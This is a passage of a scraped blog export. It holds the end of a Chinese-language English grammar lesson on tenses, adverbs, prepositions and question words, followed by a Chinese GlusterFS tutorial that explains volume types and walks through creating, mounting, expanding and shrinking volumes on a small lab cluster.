,主语是第三人称单数的时候用&quot; is going to&quot; ,主语是you或者复数的时候用&quot;are going to&quot; . I am going to be busy tomrrow = I will be busy tomorrow 我明天会忙 You are going to be happy tomorrow= You will be happy tommorrow 你明天会开心。 现在进行时态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748现在进行时态用在&quot;表示主语此时此刻正在进行的动作&quot;的句子里面，注意，这个时态强调此时此刻的动作。所有跟前面的三个时态有区别。这个时态只有动作的句子。没有状态的句子。主语+be(is/am/are)+动词的现在分词+宾语注意: 这里的be不是系动词，不是“主语+be+表语”里面的“be”。这个be是做助动词的，没有意思，只是起到辅助构成现在进行时态的作用。&quot;be&quot;和动词的现在分词一起构成复合谓语。 当“be”动词 “Is/are/am”充当系动词的时候，后面跟的是表语，不能跟实义动词。比如。 I am a teacher 我是一个老师 She is a nurse 她是一名护士。 We are students 我们是学生。 当我们看到“is/are/am+ 动词的现在分词”的时候，那么，我们就可以说，这个“is/are/am”是助动词，没有意思，只是跟后面的现在分词一起构成复合谓语。比如: I am working now 我现在正则工作。 这里的&quot;am + working &quot;就是现在进行时态的复合谓语。 You are smiling 你正则微笑 She is running 她正在跑步 He is sleeping 他正在睡觉。 We are swinning 我们正在游泳。 The man is running 这个男人正在跑步。 I am drinking water 我正在喝水。 You are driving a bus 你正在开巴士。 现在进行时态的肯定句一般用在回答下面的一类特殊疑问句的时候，比如。What are you doing? 你现在正在做什么?What is she doing? 她正在做什么？What is he doing? 他正在做什么?二、现在进行时态一般疑问句的构成方式。构成一般疑问句规则直接把助动词is/are/am移到句首，然后现在分词不改变，就可以了。肯定句: I am teacheing English now. 我现在正在教英语。疑问句: Are you teacheing English now? 你现在正在教英语吗?肯定回答: yes, I am 是的否定回答: no, I am not 不肯定句: He is studying 他正在学习疑问句: Is he studying? 他正在学习吗?现在进行时态特殊的用法:1. 现在进行时态也可以表示目前一段时间内正在进行的动作,比如:What's he doing this week? 这个星期他在干嘛?he is writing a book 他在写一本书They are studying in Beijing 他们在北京学习。2. 现在进行时态常于 always,constantly 等连用。表示反复出现或习惯性动作。类似于一般现在时态的作用。比如:She is always smiling happliy 她总是愉快的微笑(带有赞赏表扬的感情色彩)She always smiles happiiy 她总是愉快的微笑。 (没有感情色彩，仅仅强调经常性的动作) 副词1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495时间副词，地点副词，方式副词主要做状语，程度副词用来修饰形容词和方式副词。频度副词也是做状语，只是位置不同而已。一、时间副词Now soon Ago every day today tomorrow yesterday tonight现在 马上，很快 以前 每天 今天 今晚just now early late before finally eventually once 刚才 早 迟,晚 以前 终于 最后 曾经 recently already just lately immediately then 最近 已经 刚刚 最近 立即 然后 时间副词作时间状语可以放在主谓宾和主系表句型后面 1. 主语+谓语+宾语+时间副词(状语) (包括其他几个动作的句型) 2. 主语+be+表语+时间副词(状语) 但是，时间副词做时间状语的时候，要特别注意时态的问题。不同的时间副词，能用在不同的时态里面，有些时间副词不能用在特定的时态。比如: I am learning English now 我现在正在学英语。 另外, now 可以用在一般现在时态主系表结构的句子里面。比如 I am busy now 我现在忙 She is tired now 她现在累 Joe is tired now 乔现在累。 soon 主要用在一般将来时态: I will go home soon 我马上回家 I will be rich soon 我马上有钱了。 ago 不能单独用，前面需要加表示时间长度的词语。 I was a middle school student two years ago 两年前我是中学生。 I bought a watermelon two days ago 两天前我买了一个西瓜。 二、地点副词here there downstairs upstairs home above back在这里 在那里 在楼下 在楼上 在家，回家 在上面 在后面，回来upwards nearby outside off down up abroad向上 在附近 在外面 离开 向下，在下面 向上 在国外Around everywhere indoors outdoors anywhere在周围 到处 在户内 在户外 到处(否定)地点副词主要是用来做地点状语，地点副词作地点状语的时候通常不收时态影响。只要符合逻辑，基本大部分的时态都可以出现地点副词作状语。I am visiting a friend here 我正在这里拜访一个朋友。I am happy here 我在这里开心I am here 我在这里。Time is up 时间到了。let him out 让他出去。三、方式副词表示动作的方式副词称为方式副词。方式副词只能作方式状语。方式副词比较多，因为大部分方式副词都是由“形容词+ly”构成的。也有部分是独立。所以不能单看&quot;ly&quot;来判断方式副词，比如&quot;Hard 努力地，fast 快，&quot;这两个都没有ly结尾。 但都是方式副词。而“friendly 友好的，lovely 可爱的” 这两个词都有&quot;ly&quot;结尾。但是属于形容词，而不是方式副词。常见的方式副词：Carefully fast angrily warmly suddenly slowly excitedly 小心地 快 生气地 热心地 突然地 慢慢地 兴奋地quickly happily beautifully loudly bravely naturally safely很快地 幸福地 漂亮地 大声地 勇敢地 自然地 安全地patiently well/easily Very much coldly crossly=angrily nervously耐心地 好容易地 非常地 冷淡地 生气地 紧张地方式副词只能放在动作的句子后面做方式状语。I love you very mouch 我非常爱你I like your book very mouch. 我非常喜欢你的书She cried suddenly 她突然哭了。排列顺序 方式副词 地点副词 时间副词四、程度副词 程度副词比较容易掌握，中文里面表示某种程度的时候，就会用这些词语: “很”“非常”“特别”等等，比如可以说：“很好”“非常好”，&quot;特别好&quot;，“相当好”“十分好”“挺好”“太好”最近还挺流行“超”，用“超”做程度副词比如: 超好、超郁闷、超倒霉。 英文里面的程度副词:Almost nearly very Rather fairly so much quite pretty几乎 几乎 非常，很 相当 相当,很 如此,很 ...得多 相当,十分 很extremely too super really completely Extraordinarily 非常 太 超 真正的 完全地 格外地放在被修饰的形容词和方式副词的前面。如:very good 非常好so good 很好too bad 太差，太槽糕too short 太矮pretty busy 很忙。Much 这个词语比较特殊，做程度副词的时候。必须修饰形容词或方式副词的比较级，表示“...得多”。much better 好得多了much bigger 大得多much more beautiful 漂亮得多了。I have not seen her for almost ten years, 我差不多十年没有见过她了。五、频度副词always often usually sometimes seldom Occasionally Never总是 经常 通常 有时候 很少,不常 偶尔 从不频度副词也是作状语，只是位置不同，频度副词放在实义动词前；系动词，助动词，情景动词后面，I often eat rice 我经常是米饭I often play basketball 我经常打篮球。I am often busy 我经常很忙。 介词12345678910111213141516171819202122232425262728293031323334353637383940414243介词用来表明名词和代词与其他句子成分的关系叫介词。介词也叫前置语，是一种虚词，不能单独做句子成分，一般只能用在名词或代词，数词和动名词的前面。介词跟这些词语一起构成短语，这个短语称为介词短语。比如:In Guangxi(介词 + 名词) 在广西(In 跟一个表示地方的名词的时候，表示“在...地方”的意思)In the school 在这学校里面。In 1998 在1998年。以上三个结构就是介词短语。“in”这个介词最常用的意义至少有6个:(1) In 在...地方 In Guangxi 在广西(2) In 在...里面 In my room 在我的房子里面(3) In 表时间，在某年，某月 In 1998 在1998年 In May 在五月份(4) In 在...之后 In three days 三天之后(5) In +颜色=穿什么衣服 In red 穿红色的衣服(6) In 用...语言 In English 用英语I can tell you a story in Enlish 我可以用英语给你讲故事。最常用的介词 In,at,on,with,for,from,of等等。介词短语有一个概念:介词宾语。介词后面的词语叫介词宾语。In Guangxi 在广西(名词Guangxi作介词宾语)介词和介词宾语在一起构成的短语叫做介词短语。under the tree 在树下behind my house 在我家房子后面beside the computer 在电脑旁边beside Nick 在尼克旁边。Beside me 在我旁边。about six 大概6点About me 关于我简单介词in after about with on at 复合介词(由两个单词组成的介词)inside into throughout分词介词(由分词充当的介词)including following短语介词(由一个词组构成的介词)in front of in front of me 在我前面。in the middle of according to instead of 必须掌握的介词 1234567891011In/of at on about after as before behind below beside between by during for from inside like near off pastaround to since through under up with within without againset among across out of into along outside 以上的介词都是一词多义的，动词短语常用的look after 照顾 look for 寻找 get up 起床 give up 放弃 take off 脱下be good at 擅长于... show off 炫耀 be proud of 为...感到自豪I am good at playing basketball I am proud of being Chinase. 我为我是中国人感到自豪。 at 1234567891011121.介词 at 可以表示地点，在...地方，在...附近。at the hotel 在这个酒店 at the cinema 在电影院注意,“at+小地方”容易跟“in+小地方”混淆，但是at强调的是“在...地方或在...附近”而in强调的是“在里面，在...内部” 比如:in the hotel 在酒店里面 强调“在里面”at the hoter 在这个酒店 强调就“在...地方&quot;at the bus stop 在公共汽车站牌。2. 表示时间 在...时刻At 都是加一个基数词，表示在几点钟。At 21:29 在 21点29分。At 6:00 o'clock/At six o'clock 在六点整。 on 123456789101112131415161718192021221.(位置)在...上面On 一般加一个表示“物体的名词或代词”构成一个介词短语，表示“在这个物体的上面，并且强调跟物体的表名接触”，比如:on the roof 在房顶。 on the floor 在地板上 on the wall 在墙壁上 on the playground 在操场上。Children are playing a game on the floor 孩子们在地板上玩游戏。2.(时间)在...时候一般表示在一天之内的时间。表示在某日，星期几，日期或者某日的上午，下午，中午，晚上等等。on Saturday 在星期六。 on July 15 在七月十五号。On Sunday morning 在星期天的早上。3.(表示状态)处于...状态。这种用法基本都是固定的介词短语，记住常用的就行了。who is on duty today? 今天谁值日?the house is on fire 这房子着火了。4.(表示关系)关于，有关，论及表示这种意思的时候 on 跟about 是同义词。区别就是on是正式用语，书面语会出现。about 是普通用语，口语和书面语都很常见。 现在完成时态12345678910111213141516171819202122232425262728293031323334353637当表示一个动作或状态从过去延续到现在这种意义的时候，就需要使用现在完成时态来表达。比如:&quot;我已经学了10年英语了&quot;这句话就强调了“动作”从过去延续到现在，学习英语的动作延续了十年。I have learned English for ten years.现在完成时态的构成方式 现在完成时态有助动词“have(has)+过去分词”构成。 助动词&quot;has&quot;用于主语是第三人称单数的时候。have用于主语是其他各种人称的时候。 动作型 1. 主语+have/has+动词过去分词+宾语+状语，肯定句构成方式I have worked here It has sat We have lived here疑问句 只要把助动词&quot;have,has&quot;移到句首，并且动词的过去分词不变，就可以变成一般疑问句了。Have they walked?Have you worked here?Has Nick slept here?否定句They have not walked.状态型3.主语+be+表语 肯定句构成方式主语+be+表语 在现在完成时态里面，首先要加上助动词&quot;have,has&quot;，然后把系动词&quot;be&quot;变成过去分词&quot;been&quot;，这样，主语+be+表语 句型在现在完成时态里面就变成了“主语+ have/has +been +表语。例如：I have been busy You have been richShe has been beautiful疑问句只要把助动词&quot;have,has&quot;移到句首，并且过去分词&quot;been&quot;不变，就可以变成一般疑问句。Have you been busy?Has Nick been busy? 情态动词12345情态动词数量不多Can could(can的过去式) may(可以) might(may 过去式) Should (应该) must(必须) have to (不得不) dare (敢) Needn't (不必) had better (最好)Ought to = should Be able to = can情态动词主要的作用就是加上动词原型构成复合谓语。情态动词必须跟动词原型。 特殊疑问句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576特殊疑问句的构成方式由疑问词 + 一般疑问句构成。英文的疑问词一般有Where what why whose when whom who which how在哪里 什么 为什么 谁的 什么时候 谁 谁 哪一个 如何，怎样where 在哪里where 这个疑问词表示在哪里，哪里，可以表示特殊疑问句里面作地点状语疑问词必须放开头，Where do you learn English?疑问词“where” + 一般疑问句“do you learn English”Where do they work?第三人称单数Where does Nick teach English? Where does Jasmine drink coffee?一般过去时态Where + did +主语+动词原型+状语。Where did you have dinner yesterday? 昨天你在哪里吃饭一般将来时态Where +will +主语+动词原型+将来时间状语?where will you have dinner after class?where + be going to +主语+动词原型Where is she going to look for a job next month?现在进行时态where + is/are/am +主语+动词现在分词+宾语?Where is she drinking wine?Where is your father doing business?现在完成时态Where + have/has + 主语 +动词过去分词+宾语?Where has she gone to? 她去哪里了?Where作表语Where are you?你在哪里?Where is my money?一般过去时Where were you last night?二、 what? 1. 一般现在时态What + do +主语 + 及物动词原型+状语?What do you eat every day ?What do you do?第三人称What does Jeff like?What does your wife like?一般过去时What did you eat just now?What did they see last night?现在进行时态What are you doing? What are you saying ?What is she thinking?现在完成时态What have you done ?你到底做了什么What has he eaten?他吃了什么？","link":"/2020/11/08/English%E5%9F%BA%E7%A1%80/"},{"title":"Gluster文件系统","text":"注意：CentOS官方Yum源中Gluster已经更新为6.1版本，并且不支持条带模式。参考：https://docs.gluster.org/en/latest/Administrator%20Guide/Setting%20Up%20Volumes/ 传统的负载均衡集群 传统客户端 -&gt; 调度器 -&gt; 服务器集群 -&gt; （数据库：MySQL Cluster 或许读写分离）（memcache）（NAS，NFS）Glust客户端 -&gt; 调度器 -&gt; 服务器集群 -&gt; 存储集群（GlusterFS） 通过副本可以设置容错性HA，LB，HPC（高性能计算集群），Storage集群 常见的分布式文件系统：DFS分布式存储MFSTFS淘宝，适应海量小文件存储。开源方案。 DFS分为，无中心节点和有中心节点。 有中心节点： 性能好，角色清晰。例如 TFS，HOFS，MFS，fastFS 无中心节点： Gluster。好处是健壮性。 GlusterFS简介PB级容量，高可用性，读/写性能，基于文件系统级别共享，分布式 GlusterFS(GUN Cluster File System)是一种全对称的开源分布式文件系统，所谓全对称是指GlusterFS采用弹性哈希算法，没有中心节点，所有节点都全部平等。GlusterFS配置方便，稳定性好。可以轻松达到PB级容量。数千个节点。 2011年被红帽收购，之后推出了基于GlusterFS的Red Hat Storage server,增加了针对KVM的许多特性，可用作为KVM存储IMAGE存储集群，也可以为LB或者HA提供存储。 Glusterfs是一个开源的分布式文件系统,是Scale存储的核心,能够处理千数量级的客户端.在传统的解决 方案中Glusterfs能够灵活的结合物理的,虚拟的和云资源去体现高可用和企业级的性能存储. Glusterfs通过TCP/IP或InfiniBand RDMA网络链接将客户端的存储资块源聚集在一起,使用单一的全局命名空间来管理数据,磁盘和内存资源. Glusterfs基于堆叠的用户空间设计,可以为不同的工作负载提供高优的性能. Glusterfs支持运行在任何标准IP网络上标准应用程序的标准客户端，用户可以在全局统一的命名空间中使用NFS/CIFS等标准协议来访问应用数据. Gluster重要特性：扩展性和高性能高可用全局统一命名空间弹性hash算法弹性卷管理基于标准协议 GlusterFS重要概念：brick : GlusterFS的存储基本单元，以节点服务器目录形式展现。Volume： 多个bricks的逻辑集合Metadata： 元数据，用于描述文件，目录等的信息Self-health： 用于后台运行监测文件和目录的不一致问题，并且解决。FUSE： FileSystem userspace是一个可加载的内核模块，其支持非特权用户创建自己的文件系统而不是需要修改内核代码。GlusterFS Server： 数据存储服务器，即组成GlusterFS存储集群的节点。GlusterFS Client： 使用ClusterFS存储服务的客户。 例如：KVM存储池，OpenStack的后端存储，LB RealServer，HA Node distribute volume：分布式卷在分布式卷文件被随机地分布在整个砖的体积。使用分布式卷，你需要扩展存储，冗余是重要或提供其他硬件/软件层。(簡介：分布式卷，文件通过hash算法随机的分布到由bricks组成的卷上。卷中资源仅在一台服务器上存储，在存储池中非镜像或条带模式。) replica volume：复制卷复制卷创建跨多个砖的体积的文件的副本。您可以使用复制卷在环境中的高可用性和高可靠性是至关重要的。(簡介：复制式卷，类似raid1，replica数必须等于volume中brick所包含的存储服务器数，可用性高。创建一个两两互为备份的卷，存储池中一块硬盘损坏，不会影响到数据的使用，最少需要两台服务器才能创建分布镜像卷。） stripe volume：条带卷条带卷条纹砖之间的数据的容量。为了达到最佳效果，你应该使用条带卷，只有在高并发环境下，访问非常大的文件。(簡介：条带式卷，类似与raid0，stripe数必须等于volume中brick所包含的存储服务器数，文件被分成数据块，以Round Robin的方式存储在bricks中，并发粒度是数据块，大文件性能好。) distribute stripe volume：分布式条带卷分布式条带卷条带文件在集群中的两个或两个以上的节点。为了达到最佳效果，你应该使用分布式条带卷的要求是扩展存储和高访问非常大的文件的并发环境是至关重要的。(簡介：分布式的条带卷，volume中brick所包含的存储服务器数必须是stripe的倍数(&gt;=2倍)，兼顾分布式和条带式的功能。每个文件分布在四台共享服务器上，通常用于大文件访问处理，最少需要 4 台服务器才能创建分布条带卷。) distribute replica volume：分布式复制卷分配文件在复制砖的体积。您可以使用分布式复制卷要求规模的环境中存储和高可靠性是至关重要的。分布复制卷也提供了更好的读取性能在大多数环境 stripe replica volume：条带复制卷条带復制卷条带数据在复制集群中的砖。为了达到最佳效果，你应该使用条纹复制卷在高并发环境下并行访问非常大的文件和性能是至关重要的。在此版本中，这种类型的卷配置仅支持地图减少工作量。 Distribute stripe replicavolume：分布式条带复制卷分布式条带复制卷分布条带数据在复制砖集群。为了获得最佳效果，你应该使用分布在高并发的条带复制卷环境下并行访问非常大的文件和性能是至关重要的。在此版本中，这种类型的卷配置仅支持地图减少工作量。 ==================================================================== 常用命令：12345678gluster peer detach IP 删除集群成员gluster peer probe IP 添加集群成员gluster peer status 查看集群状态gluster volume info 查看卷信息gluster volume status 查看卷状态gluster volume add-brick test-volume 192.168.224.11:/opt/gluster/exp12/ force 添加卷gluster volume remove-brick test-volume 192.168.224.11:/opt/gluster/exp12 start 删除卷gluster volume create test-volume 192.168.224.11:/opt/gluster/exp1 192.168.224.12:/opt/gluster/exp2 192.168.224.13:/opt/gluster/exp3 force 开始部署环境准备：4台虚拟机 512内存. 每台机器添加3块2G硬盘（实验目的2G硬盘就可以了）。IP List 192.168.224.10 server 作为客户端使用Gluster 192.168.224.11 Client1 Gluster Node1192.168.224.12 Client2 Gluster Node2192.168.224.13 Client3 Gluster Node3 在所有机器上执行： 1yum -y install epel-release 在Client1-3上执行 123456yum install -y centos-release-glusteryum install -y glusterfs glusterfs-server glusterfs-fuse glusterfs-rdmasystemctl start glusterdsystemctl enable glusterdnetstat -tunlp | grep glusterdyum -y install tree 在Client1执行： 1234gluster peer probe 192.168.224.12 加入集群成员gluster peer probe 192.168.224.13 加入集群成员gluster peer status 查看集群状态 3、创建分布式卷：3.1、创建数据存储目录（在client1、client2、client3上操作）： 123[root@linux-client1 ~]# mkdir -p /opt/gluster/exp1[root@linux-client2 ~]# mkdir -p /opt/gluster/exp2[root@linux-client3 ~]# mkdir -p /opt/gluster/exp3 3.2、创建分布式卷（在client1上操作即可）： 1234[root@linux-client1 ~]# gluster volume create test-volume 192.168.224.11:/opt/gluster/exp1 192.168.224.12:/opt/gluster/exp2 192.168.224.13:/opt/gluster/exp3 force创建成功输出下面的信息volume create: test-volume: success: please start the volume to access data 3.3、查看卷的状态（在client1上操作即可）： 123456789101112131415[root@linux-client1 ~]# gluster volume infoVolume Name: test-volumeType: DistributeVolume ID: e2248fcf-a37c-44af-92ce-9e31a3a98764Status: CreatedSnapshot Count: 0Number of Bricks: 3Transport-type: tcpBricks:Brick1: 192.168.224.11:/opt/gluster/exp1Brick2: 192.168.224.12:/opt/gluster/exp2Brick3: 192.168.224.13:/opt/gluster/exp3Options Reconfigured:transport.address-family: inetnfs.disable: on 4、创建复制卷：4.1、创建数据存储目录（在client1、client2、client3上操作）： 123[root@linux-client1 ~]# mkdir /opt/gluster/exp4[root@linux-client2 ~]# mkdir /opt/gluster/exp5[root@linux-client3 ~]# mkdir /opt/gluster/exp6 4.2、创建复制卷（在client1上操作即可）： 123[root@linux-client1 ~]# gluster volume create repl-volume replica 3 transport tcp 192.168.224.11:/opt/gluster/exp4 192.168.224.12:/opt/gluster/exp5 192.168.224.13:/opt/gluster/exp6 forcevolume create: repl-volume: success: please start the volume to access data 4.3、查看卷的状态（在client1上操作即可）： 1234567891011121314151617[root@linux-client1 ~]# gluster volume info repl-volumeVolume Name: repl-volumeType: ReplicateVolume ID: 37c5200f-75f7-4f53-aca3-0a733a192708Status: CreatedSnapshot Count: 0Number of Bricks: 1 x 3 = 3Transport-type: tcpBricks:Brick1: 192.168.224.11:/opt/gluster/exp4Brick2: 192.168.224.12:/opt/gluster/exp5Brick3: 192.168.224.13:/opt/gluster/exp6Options Reconfigured:transport.address-family: inetnfs.disable: onperformance.client-io-threads: off 5、想要用这些卷就要将它们启动：5.1、查看： 1234[root@linux-client1 ~]# gluster volume statusVolume repl-volume is not startedVolume raid0-volume is not startedVolume test-volume is not started 5.2、启动： 1234567[root@linux-client1 ~]# gluster volume start repl-volumevolume start: repl-volume: success[root@linux-client1 ~]# gluster volume start test-volumevolume start: test-volume: success 5.3、再查看： 12345678910111213141516171819202122232425262728293031[root@linux-client1 ~]# gluster volume infoVolume Name: repl-volumeType: ReplicateVolume ID: 37c5200f-75f7-4f53-aca3-0a733a192708Status: StartedSnapshot Count: 0Number of Bricks: 1 x 3 = 3Transport-type: tcpBricks:Brick1: 192.168.224.11:/opt/gluster/exp4Brick2: 192.168.224.12:/opt/gluster/exp5Brick3: 192.168.224.13:/opt/gluster/exp6Options Reconfigured:transport.address-family: inetnfs.disable: onperformance.client-io-threads: offVolume Name: test-volumeType: DistributeVolume ID: e2248fcf-a37c-44af-92ce-9e31a3a98764Status: StartedSnapshot Count: 0Number of Bricks: 3Transport-type: tcpBricks:Brick1: 192.168.224.11:/opt/gluster/exp1Brick2: 192.168.224.12:/opt/gluster/exp2Brick3: 192.168.224.13:/opt/gluster/exp3Options Reconfigured:transport.address-family: inetnfs.disable: on 6、挂载使用测试：6.1、在客户端上安装glusterfs-client客户端(在Server上操作)： 123[root@linux-Server ~]# yum install -y centos-release-gluster[root@linux-Server ~]# yum install -y glusterfs glusterfs-fuse glusterfs-rdma[root@linux-Server ~]# yum install -y glusterfs-client 6.2、创建挂载目录(在Server上操作)： 1[root@linux-Server ~]# mkdir /mnt/a1 /mnt/a2 6.3、挂载(在Server上操作)： 12[root@linux-Server ~]# mount.glusterfs 192.168.224.11:/test-volume /mnt/a1/[root@linux-Server ~]# mount.glusterfs 192.168.224.11:/repl-volume /mnt/a2/ 6.4、查看(在Server上操作)： 1234567891011[root@linux-Server ~]# df -hTFilesystem Type Size Used Avail Use% Mounted on/dev/mapper/centos-root xfs 18G 3.9G 14G 23% /devtmpfs devtmpfs 479M 0 479M 0% /devtmpfs tmpfs 489M 0 489M 0% /dev/shmtmpfs tmpfs 489M 6.8M 483M 2% /runtmpfs tmpfs 489M 0 489M 0% /sys/fs/cgroup/dev/sda1 xfs 497M 125M 373M 26% /boottmpfs tmpfs 98M 0 98M 0% /run/user/0192.168.224.11:/test-volume fuse.glusterfs 53G 13G 40G 24% /mnt/a1192.168.224.11:/repl-volume fuse.glusterfs 18G 4.5G 14G 26% /mnt/a2 6.5、写入内容(在Server上操作)： 123[root@linux-Server ~]# echo abc &gt; /mnt/a1/test1.txt #写入分布式卷[root@linux-Server ~]# echo aaa &gt; /mnt/a1/test2.txt[root@linux-Server ~]# echo aaa &gt; /mnt/a2/test3.txt #写入复制卷 6.6、查看结果（在client1、client2、client3上操作）： 123456789101112131415161718192021[root@linux-client1 ~]# tree /opt/gluster//opt/gluster/├── exp1│ └── test2.txt├── exp4 └── test3.txt[root@linux-client2 ~]# tree /opt/gluster//opt/gluster/├── exp2│ └── test1.txt├── exp5 └── test3.txt[root@linux-client3 ~]# tree /opt/gluster//opt/gluster/├── exp3├── exp6 └── test3.txt 结论： /mnt/a1/test1.txt 和 /mnt/a1/test2.txt 分布在不同的卷中/mnt/a2/test3.txt 有相同的副本 ======= ======= ======= ======= ======= ======= 7、分布式复制卷（推荐用）：7.1、创建数据存储目录（在client1、client2、client3上操作）： 123[root@linux-client1 ~]# mkdir /opt/gluster/exp10 /opt/gluster/exp11[root@linux-client2 ~]# mkdir /opt/gluster/exp10 /opt/gluster/exp11[root@linux-client3 ~]# mkdir /opt/gluster/exp10 /opt/gluster/exp11 7.2、创建分布式复制卷（在client1上操作即可）： 123[root@linux-client1 ~]# gluster volume create dreplica-volume replica 3 transport tcp 192.168.224.11:/opt/gluster/exp10/ 192.168.224.12:/opt/gluster/exp10/ 192.168.224.13:/opt/gluster/exp10/ 192.168.224.11:/opt/gluster/exp11/ 192.168.224.12:/opt/gluster/exp11/ 192.168.224.13:/opt/gluster/exp11/ forcevolume create: dreplica-volume: success: please start the volume to access data 7.3、启动分布式复制卷（在client1上操作即可）： 12345[root@linux-client1 ~]# gluster volume start dreplica-volumevolume start: dreplica-volume: success查看gluster volume info 7.4、在客户端上测试（在Server上操作）： 123456789101112131415161718192021[root@linux-Server ~]# mkdir /mnt/dreplica //创建挂载目录[root@linux-Server ~]# mount.glusterfs 192.168.224.11:/dreplica-volume /mnt/dreplica/ #挂载[root@linux-Server ~]# df -hT #查看是否挂载成功Filesystem Type Size Used Avail Use% Mounted on/dev/mapper/centos-root xfs 18G 3.9G 14G 23% /devtmpfs devtmpfs 479M 0 479M 0% /devtmpfs tmpfs 489M 0 489M 0% /dev/shmtmpfs tmpfs 489M 6.8M 483M 2% /runtmpfs tmpfs 489M 0 489M 0% /sys/fs/cgroup/dev/sda1 xfs 497M 125M 373M 26% /boottmpfs tmpfs 98M 0 98M 0% /run/user/0192.168.224.11:/test-volume fuse.glusterfs 53G 13G 40G 24% /mnt/a1192.168.224.11:/repl-volume fuse.glusterfs 18G 4.5G 14G 26% /mnt/a2192.168.224.11:/dreplica-volume fuse.glusterfs 18G 4.5G 14G 26% /mnt/dreplica [root@linux-Server ~]# echo 1 &gt; /mnt/dreplica/1.txt #写入内容[root@linux-Server ~]# echo 1 &gt; /mnt/dreplica/2.txt[root@linux-Server ~]# echo 1 &gt; /mnt/dreplica/3.txt[root@linux-Server ~]# echo 1 &gt; /mnt/dreplica/4.txt 7.5、查看结果（在client1、client2、client3上操作）： 12345678910111213141516171819202122232425262728293031[root@linux-client1 ~]# tree /opt/gluster/...├── exp10│ └── 4.txt├── exp11│ ├── 1.txt│ ├── 2.txt│ └── 3.txt...[root@linux-client2 ~]# tree /opt/gluster//opt/gluster/├── exp10│ └── 4.txt├── exp11│ ├── 1.txt│ ├── 2.txt│ └── 3.txt...[root@linux-client3 ~]# tree /opt/gluster//opt/gluster/├── exp10│ └── 4.txt├── exp11│ ├── 1.txt│ ├── 2.txt│ └── 3.txt... ========================================================== ============================================================ 添加扩容和删除卷（https://gluster.readthedocs.io/en/latest/Administrator%20Guide/Managing%20Volumes/）： 添加扩容卷分布式卷：8.1、在客户端写入数据（在Server上操作）： 12345678910111213141516[root@linux-Server ~]# touch /mnt/a1/{10..19}.txt[root@linux-Server ~]# ll /mnt/a1/total 1-rw-r--r-- 1 root root 0 Sep 18 11:39 10.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 11.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 12.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 13.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 14.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 15.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 16.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 17.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 18.txt-rw-r--r-- 1 root root 0 Sep 18 11:39 19.txt-rw-r--r-- 1 root root 4 Sep 18 10:36 test1.txt 8.2、创建一个目录并添加卷（在client1上操作）： 1234567891011121314151617181920212223242526272829303132333435363738394041[root@linux-client1 ~]# mkdir /opt/gluster/exp12 //创建要添加的目录[root@linux-client1 ~]# gluster volume add-brick test-volume 192.168.224.11:/opt/gluster/exp12/ force //添加卷volume add-brick: success[root@linux-client1 ~]# gluster volume info test-volume //查看Volume Name: test-volumeType: DistributeVolume ID: e2248fcf-a37c-44af-92ce-9e31a3a98764Status: StartedSnapshot Count: 0Number of Bricks: 4Transport-type: tcpBricks:Brick1: 192.168.224.11:/opt/gluster/exp1Brick2: 192.168.224.12:/opt/gluster/exp2Brick3: 192.168.224.13:/opt/gluster/exp3Brick4: 192.168.224.11:/opt/gluster/exp12Options Reconfigured:transport.address-family: inetnfs.disable: on[root@linux-client1 ~]# tree /opt/gluster/exp12/ //查看没有数据过来，是因为没有开启均衡/opt/gluster/exp12/0 directories, 0 files[root@linux-client1 ~]# gluster volume rebalance test-volume start //现在开启均衡volume rebalance: test-volume: success: Rebalance on test-volume has been started successfully. Use rebalance status command to check status of the rebalance process.ID: bcb58321-2f43-4b09-96a1-5833d020b7b2[root@linux-client1 ~]# tree /opt/gluster/exp12/ //再次验证就有数据了/opt/gluster/exp12/├── 11.txt├── 14.txt└── 16.txt 9、删除卷： 1234567891011[root@linux-client1 ~]# gluster volume remove-brick test-volume 192.168.224.11:/opt/gluster/exp12 startRunning remove-brick with cluster.force-migration enabled can result in data corruption. It is safer to disable this option so that files that receive writes during migration are not migrated.Files that are not migrated can then be manually copied after the remove-brick commit operation.Do you want to continue with your current cluster.force-migration settings? (y/n) yvolume remove-brick start: successID: 248846f3-c47d-4097-bcd1-6fc625d95d66 9.1、删除后验证数据是否还在： 123[root@linux-client1 ~]# tree /opt/gluster/exp12/ //在client1的目录exp12上没有数据了/opt/gluster/exp12/ 9.2、数据分到了client3上： 12345678910[root@linux-client3 ~]# tree /opt/gluster/ //数据11、14、16分过来了/opt/gluster/├── exp3│ ├── 10.txt│ ├── 11.txt│ ├── 12.txt│ ├── 14.txt│ ├── 15.txt│ ├── 16.txt│ └── 18.txt ==================================总结：第一，分布卷: 存储与多个不同的位置第二，复制卷：相同副本存储于多个不同位置。第三，条带卷： 文件的内容分散在多个位置。第四，分布式条带卷（复合型）： 在条带的基础上，服务器数目是2倍以及上第五，分布式复制卷（复合型）： 在复制的基础上，服务器数目是2倍及以上。第六， 条带复制卷（复合型）： 在条带的基础上，创建多个拷贝。第七，分布式条带复制卷(三種混合型)： 在条带/复制的基础上。服务器数目是2倍及以上。 第一，分布卷 12345gluster volume create test-volume server1:/exp1 server2:/exp2 server3:/exp3 server4:/exp4 第二，复制卷 12345gluster volume create test-volume replica 2 transport tcp server1:/exp1 server2:/exp2 第三，条带卷 1234gluster volume create test-volume stripe 2 transport tcp server1:/exp1 server2:/exp2 第四，分布式条带卷（复合型）分布式的条带卷，volume中brick所包含的存储服务器数必须是stripe的倍数(&gt;=2倍)，兼顾分布式和条带式的功能。每个文件分布在四台共享服务器上，通常用于大文件访问处理，最少需要 4 台服务器才能创建分布条带卷。) 1234567gluster volume create test-volume stripe 2 transport tcp server1:/exp1 server2:/exp2 server3:/exp3 server4:/exp4 第五，分布式复制卷（复合型）分布式的复制卷，volume中brick所包含的存储服务器数必须是 replica 的倍数(&gt;=2倍)，兼顾分布式和复制式的功能。 1234567gluster volume create test-volume replica 2 transport tcp server1:/exp1 server2:/exp2 server3:/exp3 server4:/exp4 第六， 条带复制卷（复合型） 123456789gluster volume create test-volume stripe 2 replica 2 transport tcp 